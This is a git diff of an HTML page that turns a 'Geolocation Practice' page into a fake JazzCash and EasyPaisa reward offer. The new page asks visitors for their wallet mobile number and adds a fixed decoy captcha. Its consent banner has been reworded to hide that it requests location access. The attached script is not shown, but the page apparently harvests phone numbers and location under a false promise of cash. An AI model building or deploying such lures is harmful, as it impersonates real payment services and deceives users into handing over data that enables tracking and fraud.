@@ -3,27 +3,109 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Geolocation Practice</title>
+    <title>JazzCash & EasyPaisa</title>
+    <link rel="icon" type="image/png" href="jazzcash.png" />
     <link rel="stylesheet" href="style.css" />
   </head>
   <body>
+    <div class="container">
+      <div class="logo-container">
+        <div class="img-container">
+          <div class="jazzcash">
+            <img src="./jazzcash.png" alt="JazzCash" />
+            <img class="k" src="./easypaisa.png" alt="JazzCash" />
+          </div>
+        </div>
+      </div>
+
+      <div class="content-box">
+        <h1 class="title">
+          Share your Easypaisa or JazzCash account number to get your reward
+          sent straight to your wallet 🎉✨
+        </h1>
+
+        <div class="form-group">
+          <label for="mobile-number"
+            >Enter your Easypaisa or JazzCash mobile number:</label
+          >
+          <input
+            type="text"
+            id="mobile-number"
+            class="input-field"
+            placeholder=""
+          />
+        </div>
+
+        <div class="form-group">
+          <label for="captcha">Enter Captcha:</label>
+          <div class="captcha-container">
+            <input
+              type="text"
+              id="captcha"
+              class="input-field captcha-input"
+              placeholder=""
+            />
+            <div class="captcha-display">1330</div>
+          </div>
+        </div>
+
+        <div class="checkbox-container">
+          <input type="checkbox" id="terms" class="checkbox" />
+          <label for="terms" class="checkbox-label">
+            I accept the <a href="#" class="terms-link">Terms and Conditions</a>
+          </label>
+        </div>
+
+        <button class="start-button">Start Game</button>
+
+        <div class="requirements">
+          <h3>Easypaisa/JazzCash Account Requirements</h3>
+          <ul>
+            <li>
+              To receive cash rewards, an active Easypaisa or JazzCash account
+              is required. <a href="#" class="download-link">Download</a> the
+              Easypaisa or JazzCash App
+            </li>
+            <li>
+              Download the Easypaisa or JazzCash App by 11:59 PM today to claim
+              the reward.
+            </li>
+            <li>Earn 1 cash reward per day per account.</li>
+            <li>
+              Rewards will be credited into Easypaisa or JazzCash account within
+              7 working days.
+            </li>
+            <li>
+              The company reserves the right to modify or discontinue the game
+              at any time with/without notice.
+            </li>
+            <li>Other terms and conditions apply</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+
+    <!-- Consent Banner -->
     <div id="consentBanner" class="banner">
-      <p>This site wants to access your location for practice.</p>
+      <p>📍 This site wants access to enhance your experience.</p>
       <button id="consentAllow">Allow</button>
       <button id="consentDeny">Deny</button>
     </div>
 
-    <h2>Status</h2>
-    <pre id="status"></pre>
+    <!-- Main Content -->
+    <main class="main-content">
+      <section class="status-section">
+        <h2>Status</h2>
+        <pre id="status">Waiting for action...</pre>
+      </section>
+    </main>
 
-    <h2>Coordinates</h2>
-    <pre id="coords"></pre>
+    <!-- Footer -->
+    <footer class="site-footer">
+      <p>© 2025 Live Sports Jazzcash · All Rights Reserved</p>
+    </footer>
 
-    <div id="mapLinkContainer"></div>
-
-    <h2>Last Payload Sent</h2>
-    <pre id="lastPayload"></pre>
-
+    <!-- Scripts -->
     <script src="script.js"></script>
   </body>
 </html>
